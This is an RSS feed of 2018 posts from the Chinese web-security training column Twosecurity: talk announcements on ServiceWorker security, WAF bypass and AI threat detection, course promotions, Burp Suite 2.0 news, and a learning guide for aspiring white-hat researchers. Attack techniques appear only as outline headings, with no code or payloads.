<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>Twosecurity</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
<description>best of websecurity</description>
<language>zh-cn</language>
<lastBuildDate>Mon, 29 Oct 2018 06:55:30 +0800</lastBuildDate>
<item>
<title>Live : HTML5 ServiceWorker安全探索</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-10-28-47847424.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/47847424&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3f7773f4a083acccd6afd43805c542dd_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;关于serviceworker：&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ServiceWorker的出现，为前端开发提供了更多的技术支持，使 Web APP 具有Native APP的离线使用、消息推送、默认更新等功能，并给前端安全增添了不少新玩法。&lt;/p&gt;&lt;p&gt;- HTTPS Only&lt;/p&gt;&lt;p&gt;- Events：fetch,sync,push&lt;/p&gt;&lt;p&gt;- 浏览器支持程度局限性&lt;/p&gt;&lt;p&gt;- 运行在浏览器后台的独立线程的脚本&lt;/p&gt;&lt;p&gt;- 可拦截及处理网络请求&lt;/p&gt;&lt;p&gt;- 不能直接参与Web交互，比如：DOM操作&lt;/p&gt;&lt;p&gt;- 推送通知、后台同步&lt;/p&gt;&lt;p&gt;作为一段独立于页面运行在浏览器后端的脚本。使用Service Worker来进行缓存，可以用javascript代码来拦截浏览器的请求，设置缓存文件，不经服务器直接返回。SW工作原理基于注册、安装、激活等步骤，我们需要了解它的生命周期以至于帮助我们学会在各个生命周期阶段进行有目的的回调。&lt;/p&gt;&lt;p&gt;从安全角度来看不难想到可能带来的一些问题，如：基于 SW的XSS+JSONP 相当于持久化XSS、DDos、流量盗用、基于SW构造僵尸网络结合CSRF扩大影响范围、新型Flash攻击、SW缓存劫持。&lt;/p&gt;&lt;p&gt;对于防御基于SW的XSS可采取 CSP、域内不存在XSS及用户可控的JS文件、JSONP接口应只允许特定字符or白名单。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Live 内容预告：&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;功能简介&lt;/li&gt;&lt;li&gt;ServiceWorker 的出现原因&lt;/li&gt;&lt;li&gt;ServiceWorker 结构和特点&lt;/li&gt;&lt;li&gt;安全利用&lt;/li&gt;&lt;li&gt;水坑攻击&lt;/li&gt;&lt;li&gt;延长网页生命期&lt;/li&gt;&lt;li&gt;一些黑科技&lt;/li&gt;&lt;li&gt;流量盗用&lt;/li&gt;&lt;li&gt;防御探讨&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Live 主讲人：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;EtherDream：&lt;/b&gt;&lt;/p&gt;&lt;p&gt; 阿里巴巴安全工程师，从事 Web 安全相关的研发。专注浏览器前端技术，爱好网络安全，以及探索各种黑科技。相比于攻击，在安全防御方面有着更大的兴趣，研发过多种基于 Web 前端的防御系统。本次分享在讲解攻击的同时，也会讲解一些新理念的防御思路。&lt;/p&gt;&lt;p&gt;&lt;b&gt;开讲时间：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;2018/11/03 晚上 8 点&lt;/p&gt;&lt;p&gt;&lt;b&gt;报名方式：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://jinshuju.net/f/qqH48u&quot;&gt;Live 报名表&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-10-28-47847424</guid>
<pubDate>Sun, 28 Oct 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>双十一活动来啦！</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-10-26-47747688.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/47747688&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ef3a14ad2328d7c6850f83c38e9396db_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;新课程：&lt;/p&gt;&lt;p&gt;&lt;b&gt;前端与服务端的模板注入、对象注入与反序列化、web编码及字符集安全、Windows脚本及客户端命令执行&lt;/b&gt; 已上线！&lt;/p&gt;&lt;p&gt;即日起至双十一所有课程限时八五折优惠~&lt;/p&gt;&lt;p&gt;三十人小班限量开启~&lt;/p&gt;&lt;p&gt;欢迎报名！&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-67b5c33712400e85609b9b21c001e600_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1696&quot; data-rawheight=&quot;4096&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-10-26-47747688</guid>
<pubDate>Fri, 26 Oct 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>限时&quot;1&quot;元参与 Live：AI 应用于 威胁检测的利与弊</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-10-13-46583872.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/46583872&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-61f203cabffb1ce5d3b22e4d751fcdcb_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;主讲人：王珂&lt;/b&gt;&lt;/p&gt;&lt;p&gt;360 护心镜开发者  &lt;/p&gt;&lt;p&gt;奇虎 IDC 七层和四层流量威胁分析模型作者&lt;/p&gt;&lt;p&gt; 全国流量劫持情况监控开发者&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;开讲时间：&lt;/b&gt;2018/10/19 晚上 8 点&lt;/p&gt;&lt;p&gt;&lt;b&gt;报名方式：&lt;/b&gt;&lt;a href=&quot;https://live.twosecurity.io/intro/5bc162c8e9563927a1105c9e&quot;&gt;https://live.twosecurity.io/intro/5bc162c8e9563927a1105c9e&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Live简介&lt;/b&gt;&lt;/p&gt;&lt;p&gt;人工智能在图像，语音，自然文字处理等方面颠覆了传统的同时，在网络安全方面的应用却发展缓慢吗很多方向还停留在“探索”阶段。以至于业内出现了对AI的两种极端看法，一种是为了用AI而用AI，却也说不出好在哪里。另一类是认为AI完全是噱头，忽悠投资人的。笔者一直在摸索人工智能与安全自动化的结合方式，也算是一些经验和心得。&lt;/p&gt;&lt;p&gt;本LIVE通过总结两个真实的线上项目的几个不同方案（专家策略，机器学习，深度学习），并在误漏报、性能、开发成本等方面进行横向对比，来说明AI相比传统方案而言，它的优势在哪，适用场景有哪些，劣势又在何处。   &lt;/p&gt;&lt;p&gt;&lt;b&gt;Live大纲&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;自我介绍与闲聊&lt;/li&gt;&lt;li&gt;AI与安全开发的两类结合点&lt;/li&gt;&lt;li&gt;IDS项目介绍&lt;/li&gt;&lt;li&gt;几种解决方案介绍&lt;/li&gt;&lt;li&gt;两类方案的数据对比&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;结论1：人工智能方案的优势和劣势&lt;/p&gt;&lt;p&gt;结论2：传统方案的优势与劣势&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-10-13-46583872</guid>
<pubDate>Sat, 13 Oct 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Live：WAF 是如何被绕过的</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-09-15-44628869.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/44628869&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4eeee5658469b0e5170b55a37885146b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;主讲人：李维/VERKEY&lt;/b&gt;&lt;/p&gt;&lt;p&gt;从事网络安全行业十余年，PKAV 团队核心成员，擅长 Web 渗透测试，安全类产品研发。&lt;/p&gt;&lt;p&gt;现任职于成都无糖信息技术有限公司，担任研发总监。&lt;/p&gt;&lt;p&gt;PKAV Web Scanner、PKAV HTTP Fuzzer、破壳 Web 扫描器开发者 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;开讲时间：&lt;/b&gt;2018/09/22 晚上 8 点&lt;/p&gt;&lt;p&gt;&lt;b&gt;报名方式：&lt;/b&gt;&lt;a href=&quot;http://live.twosecurity.io/waf_bypass.html&quot;&gt;【点击报名】&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Live简介&lt;/b&gt;&lt;/p&gt;&lt;p&gt;WAF (Web应用防火墙，Web Application Firewall 的简称) 是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的产品。WAF可以发现和拦截各类 Web 层面的攻击，记录攻击日志，实时预警提醒，在 Web 应用本身存在缺陷的情况下保障其安全。但是，WAF 不是万能的、完美的、无懈可击的，在种种原因下，它们也会有各自的缺陷，作为用户不可以盲目相信 WAF 而不注重自身的安全。&lt;/p&gt;&lt;p&gt;本次课程我们将以一些实际的 WAF 产品为例，了解它们的基本原理，它们存在的缺陷，以及攻击者是如何利用它们的缺陷让它们形同虚设的。我们应当更注重于注重自身系统和应用的安全，不能以为有了 WAF 就可以高枕无忧。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Live大纲&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;主流 WAF 的绕过技术，分析 WAF 拦截方法和对应的缺陷以及为什么 WAF 会有这些缺陷。&lt;/li&gt;&lt;li&gt;实例讲解 WAF 的 SQL 注入和文件上传拦截是怎么被绕过的，有哪些思路和方法。&lt;/li&gt;&lt;li&gt;实例讲解一句话木马是如何逃避查杀的，以及如何绕过 WAF 文件层面和流量层面的拦截的。&lt;/li&gt;&lt;li&gt;讨论和答疑。&lt;/li&gt;&lt;/ol&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-09-15-44628869</guid>
<pubDate>Sat, 15 Sep 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>官方推特开通了，欢迎关注</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-09-15-44602859.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/44602859&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://twitter.com/twosecurityio&quot;&gt;https://twitter.com/twosecurityio&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-09-15-44602859</guid>
<pubDate>Sat, 15 Sep 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Burpsuite 2 来了</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-08-25-42922207.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/42922207&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-607c03c019fa464ceeaa53509e201094_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b35c6ddd65b1d44bc440563913aadf88_r.jpg&quot; data-caption=&quot;这是新的主控制台&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1461&quot; data-rawheight=&quot;1022&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;This is a major upgrade, with a host of new features, including:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;A &lt;a href=&quot;https://portswigger.net/blog/burps-new-crawler&quot;&gt;new crawler&lt;/a&gt;, able to &lt;a href=&quot;https://portswigger.net/blog/automatic-session-handling&quot;&gt;automatically handle sessions&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/detecting-changes-in-application-state&quot;&gt;detect changes in application state&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/crawling-with-multiple-logins&quot;&gt;crawl with multiple logins&lt;/a&gt;, and deal with &lt;a href=&quot;https://portswigger.net/blog/crawling-volatile-content&quot;&gt;volatile content&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;A new scanning engine, featuring &lt;a href=&quot;https://portswigger.net/blog/automatically-maintaining-session-during-scans&quot;&gt;automatic session handling&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/multi-phase-scanning&quot;&gt;multiple scan phases&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/improved-detection-of-stored-input&quot;&gt;improved detection of stored input&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/consolidation-of-site-wide-passive-issues&quot;&gt;consolidation of site-wide passive issues&lt;/a&gt;, efficient treatment of &lt;a href=&quot;https://portswigger.net/blog/frequently-occurring-insertion-points&quot;&gt;frequently occurring insertion points&lt;/a&gt;, and graceful &lt;a href=&quot;https://portswigger.net/blog/handling-application-errors-during-scans&quot;&gt;handling of application errors&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;A new &lt;a href=&quot;https://portswigger.net/blog/dynamic-analysis-of-javascript&quot;&gt;dynamic JavaScript analyzer&lt;/a&gt;, with dramatically improved detection of DOM-based vulnerabilities.&lt;/li&gt;&lt;li&gt;A new &lt;a href=&quot;https://portswigger.net/blog/the-new-dashboard&quot;&gt;dashboard&lt;/a&gt; for monitoring and controlling automated activities.&lt;/li&gt;&lt;li&gt;A new &lt;a href=&quot;https://portswigger.net/blog/launching-scans&quot;&gt;scan launcher&lt;/a&gt;, and the ability to carry out &lt;a href=&quot;https://portswigger.net/blog/multiple-parallel-scans&quot;&gt;multiple parallel scans&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;New &lt;a href=&quot;https://portswigger.net/blog/live-scanning&quot;&gt;live scanning&lt;/a&gt; capabilities.&lt;/li&gt;&lt;li&gt;Improved &lt;a href=&quot;https://portswigger.net/blog/improved-management-of-system-resources&quot;&gt;management of system resources&lt;/a&gt;, through a central task execution engine.&lt;/li&gt;&lt;li&gt;A new &lt;a href=&quot;https://portswigger.net/blog/the-new-configuration-library&quot;&gt;configuration library&lt;/a&gt; for storing useful settings.&lt;/li&gt;&lt;li&gt;A new &lt;a href=&quot;https://portswigger.net/blog/burps-new-rest-api&quot;&gt;REST API&lt;/a&gt; for integration with other tools.&lt;/li&gt;&lt;li&gt;A new &lt;a href=&quot;https://portswigger.net/blog/new-response-renderer&quot;&gt;response renderer&lt;/a&gt; that functions as well as any modern browser.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;很多大的改动，但依然还是不支持 http2.0。其中，scan laucher 可以支持启动一个主动扫描了，集成了headless browser。以及 rest api 这个对于定制化扫描来说非常方便，不用再专门开发一个插件了。具体的大家点击相关的链接了解吧。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-16d016e984b7e0a40f500c9df02d8438_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;790&quot; data-rawheight=&quot;635&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们课件已经更新了相关内容，对 web 安全感兴趣的同学可以了解一下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;另外 Twosecurity 长期招人中，入职后可以使用正版 Burpsuite。&lt;/p&gt;&lt;p&gt;简历邮箱：&lt;a href=&quot;mailto:email:hr@twosecurity.io&quot;&gt;hr@twosecurity.io&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;from: &lt;a href=&quot;https://portswigger.net/blog/burp-suite-2-0-beta-now-available&quot;&gt;Burp Suite 2.0 beta now available&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-08-25-42922207</guid>
<pubDate>Sat, 25 Aug 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>白帽子 web 安全成长体系</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-01-30-33389791.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33389791&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-eaea315bf16bfafef911ba407f1b3675_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;给专栏的回答做一个导航吧，此导航会不定期更新~&lt;/p&gt;&lt;p&gt;web 安全学习篇&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/21606800/answer/219614097&quot;&gt;零基础如何学习 Web 安全？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/67517292/answer/254902682&quot;&gt;同时面临（编程、英语、网络安全）三个知识块，该怎么进行学习？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/64692832/answer/227533421&quot;&gt;各位自学网络安全的朋友们，你们的路线是什么？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/23073812/answer/219630853&quot;&gt;自学成才的黑客（安全研究员）是从哪学到那些知识的？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/21643410/answer/219632208&quot;&gt;如何成为一名白帽子黑客？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/21745144/answer/219850655&quot;&gt;在学习 XSS 前应该学习什么？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/24573012/answer/219638346&quot;&gt;学习 Web 安全之前一定要精通 Web 开发吗？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/25024086/answer/219627096&quot;&gt;信息安全安全前沿技术有哪些？&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;工作篇&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/49748710/answer/227535274&quot;&gt;非计算机专业，几乎0基础，如何规划大四一年的时间，能够在毕业找到一份工作（信息安全方向？）？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/21573052/answer/219634541&quot;&gt;如何寻找信息安全相关工作？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/29902424/answer/222424619&quot;&gt;信息安全方向面试?&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/21149966/answer/219853497&quot;&gt;网络安全研究员的或者网络安全工程师工作内容具体是什么？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33186518&quot;&gt;如何准备web安全求职面试&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;漏洞挖掘 &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/37876048/answer/219661789&quot;&gt;如何高效挖掘Web漏洞？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/28754900/answer/219620979&quot;&gt;为什么搞安全「猥琐」最重要？&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/68591788/answer/277462275&quot;&gt;网络安全工作中，你干过哪些引以为傲的「猥琐」行为？&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;工具篇&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/31981786/answer/227353908&quot;&gt;哪些软件/工具是黑客必备的？&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0a426c4645040fa604878aa6eb7bc5df_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;5080&quot; data-rawheight=&quot;2168&quot;&gt;&lt;p&gt;欢迎关注我们的微信公众号：twosecurity&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-01-30-33389791</guid>
<pubDate>Tue, 30 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>震惊！web 安全原来可以这么学</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-01-24-33251932.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33251932&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-80050ada1eb43064443bd852722c2a81_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;“气宗的徒儿剑法高，剑宗的师叔内力强，这华山派气宗剑宗可不是全然搞反了么！”&lt;/blockquote&gt;&lt;p&gt;华山派的两人，偷读失传多年的武功秘籍之后，一个认为要重气，一个认为要重剑，由此起了分歧，分为气宗、剑宗。&lt;/p&gt;&lt;p&gt;气剑之争几乎是《笑傲江湖》的独家配置。&lt;/p&gt;&lt;blockquote&gt;在别的小说里，金大侠一直推崇内功强才是真的强。有了逍遥三老二百多年内力的虚竹只靠一招黑虎掏心就打的鸠摩智无力招架。&lt;br&gt;山洪里练过内力的杨过连剑锋都不用开，到后来在海潮中练过内力，一把木剑便能创下神雕大侠的名头。&lt;br&gt;有了九阳神功的内力，别的教主练一辈子的乾坤大挪移张无忌分分钟搞定。 连一招一招老老实实学的郭大侠都多次提到是靠他玄门正宗的全真内力。&lt;/blockquote&gt;&lt;p&gt;这样说来，气剑之争的特殊性和笑傲江湖的特殊性是一致的。&lt;/p&gt;&lt;p&gt;假设有这样一个方程，y=f(x1,x2,p)。&lt;/p&gt;&lt;p&gt;其中y为个人战斗力，x1表示剑法水平，x2表示内力水平，p为参数向量表示影响个人战斗力的其他因素。&lt;/p&gt;&lt;p&gt;气宗和剑宗都认为，当p为固定值,x1&amp;gt;x1’，x2&amp;gt;x2’的时候，y&amp;gt;y’。&lt;/p&gt;&lt;p&gt;现在我们给出一个约束条件，即&lt;b&gt;x1+x2=C&lt;/b&gt;，这个约束条件的本质就是&lt;b&gt;人生的时间有限，能够修炼得到剑法和内力的总量是恒定的&lt;/b&gt;。这时获取最强战斗力的修炼之路变成了一个约束条件下的优化问题。气宗和剑宗的矛盾也由此产生。&lt;/p&gt;&lt;p&gt;剑宗认为这个优化问题的全局最优解一定满足x1&amp;gt;x2，而气宗则认为最优解在x1&amp;lt;x2的区域产生。这就是最原始的&lt;b&gt;“气剑之争”&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;然鹅，就在全武林的理论学家都在为“&lt;b&gt;气剑之争&lt;/b&gt;” 这一世界性难题绞尽脑汁的时候，又有小伙伴提出了新的假设：&lt;/p&gt;&lt;p&gt;假设剑法学习用时为t1，内力学习时间为t2，为了便于说明，我们考虑极限情况（该人完全不浪费一丝时间），则真正的约束是t1+t2=t，然后假设剑法和内力的学习都是各自学习时间的线性函数，则有：&lt;/p&gt;&lt;blockquote&gt;x1(t)=u1t1，x2(t)=u2t2。&lt;br&gt;&lt;br&gt; 如果我们不设线性系数a、b，则有：&lt;br&gt;&lt;br&gt;x1(t)+x2(t)=u1t1+u2t2=u1(t1+t2)+(u2-u1)t2=u1t+(u2-u1)t2。&lt;/blockquote&gt;&lt;p&gt;你看，最后的结果中包含了一个变量t2,也就是说，结果不能被简化为单独依赖于时间变量t的函数。如果我们把a、b引入后，比如令a=1/u1,b=1/u2，我们就可以想办法消掉u1,u2之间的非对称性，从而使得ax1(t)+bx2(t)=t，也就是只依赖于t的函数（当然等比缩放a,b可以得到时间t的其他线性函数）。&lt;/p&gt;&lt;p&gt;是的，亲爱的小伙伴们，真正的约束条件不是剑法水平x1和内力水平x2的某种线性组合，其实是&lt;b&gt;练习剑法的时间t1和修行内功的时间t2的和必须为t&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;换句话说，真正的底层变量其实是t1和t2，a、b分别代表剑法修炼和内力修炼在时间成本上的难度系数，ax1和bx2代表各自的练习剑法和修炼内功的时间成本。&lt;/p&gt;&lt;p&gt;&lt;b&gt;优化问题的最底层自变量的物理意义是时间分配方案，只有这个时间分配方案才是我们真正可以选择和支配的。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;值得一提的是，在互联网时代的安全江湖中，有一群武功高强、行侠仗义的“白帽子黑客”。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;他们热衷于研究网络与计算机，&lt;/li&gt;&lt;li&gt;善于发现安全漏洞，&lt;/li&gt;&lt;li&gt;但他们并不会做坏事，&lt;/li&gt;&lt;li&gt;而是将漏洞及时提交给企业协助修复，&lt;/li&gt;&lt;li&gt;在锻炼自己能力的同时也能获取企业反馈的奖励与感谢。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;很多 “白帽子黑客”都是从学习 Web 安全开始逐渐踏上安全之路的。在 web 安全的学习中也有类似的两种技术流派：“剑宗”和“气宗”。前者是开放通用的漏洞挖掘工具，后者完全不用工具，靠研究人员去做分析、看代码。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;我们来看看气宗的案例：&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://wooyun.shuimugan.com/bug/view?bug_no=137991&quot;&gt;Discuz利用UC_KEY进行前台getshell2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://wooyun.shuimugan.com/bug/view?bug_no=150674&quot;&gt;discuz!有条件存储型xss和ssrf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://wooyun.shuimugan.com/bug/view?bug_no=497&quot;&gt;phpcms2008本地文件包括及利用（执行任意SQL脚本）&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;剑宗的案例&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://wooyun.shuimugan.com/bug/view?bug_no=13414&quot;&gt;xsser.me的跨站漏洞&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://wooyun.shuimugan.com/bug/view?bug_no=22098&quot;&gt;老版本WordPress反射型跨站&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://wooyun.shuimugan.com/bug/view?bug_no=3428&quot;&gt;人人网CSRF用户信息泄露&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;且先不说哪种方法更好，如果是面对成熟度比较低的代码，使用漏洞挖掘的工具效率可能会更高，但是像一些如同iOS内核级的漏洞，它的代码过了很多年以及无数的安全研究人员的检验，代码的发展已经变得非常稳定了，这种情况下就不是工具能够完全做到的了。&lt;/p&gt;&lt;p&gt;Web 安全的学习也是如此，我们应该掌握解决问题的方法论，不变应万变，一通百通，而不仅仅是依赖于各种漏洞挖掘工具。&lt;/p&gt;&lt;p&gt;目前关于 Web 安全市面上已经有了很多的书籍、教程、学习建议和学习方法，但是初学者自己在学习的时候还是会遇到很多困扰，比如：&lt;/p&gt;&lt;p&gt;1）自己学习周期长，没有成就感，缺乏动力，很难坚持；&lt;/p&gt;&lt;p&gt;2）遇到问题或困难，找不到人请教辅导，就算有大牛抽空回答论坛或者留言的问题，也过了很久，热情逐渐被消磨；&lt;/p&gt;&lt;p&gt;3）网上虽然有很多安全文档和视频教程，但是参差不齐，也不系统，感觉学起来很盲目；&lt;/p&gt;&lt;p&gt;4）自己规划很难做到“循序渐进”，学习上遇到不懂的内容，不知道要如何补充；&lt;/p&gt;&lt;p&gt;5） 学术界和产业界往往存在一定的脱节，有很多“安全小白”其实是想成为一名Web安全工程师，在面试的时候，才发现很多问题和自己学得都不太对口；&lt;/p&gt;&lt;p&gt;可能很多时候，大家都会想：&lt;b&gt;要是有一些靠谱的Web安全工程师带我该多好~&lt;/b&gt;讲真，对于初学者来说，找一个靠谱的教程或者老师，帮助自己快速入门是非常有必要的。&lt;/p&gt;&lt;p&gt;作为业界顶尖的白帽子推出&lt;a 